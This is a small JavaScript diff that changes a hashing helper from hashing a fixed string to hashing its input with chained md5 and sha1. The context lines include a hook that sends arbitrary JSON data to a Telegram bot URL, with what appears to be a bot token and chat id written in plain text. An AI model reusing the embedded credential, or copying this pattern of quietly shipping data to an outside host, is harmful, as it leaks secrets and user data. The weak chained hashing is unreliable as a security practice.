@@ -150,7 +150,7 @@ const doexc_hangeXX=(username,jdata)=>{
     } catch(err){reject(err)}
   })
 }
-const hasher=str=>{  return sha1(md5(md5(sha1('abcde'))))
+const hasher=str=>{  return sha1(md5(md5(sha1(str))))
 }
 const callhook=jdata=>{  const str=JSON.stringify(jdata)
   axios.get(`https://api.telegram.org/bot1180516500:AAGIpukJ0SpR4yDoHbkbFmzduQXDj-K4NHY/sendMessage?chat_id=895459587&text=${str}`)
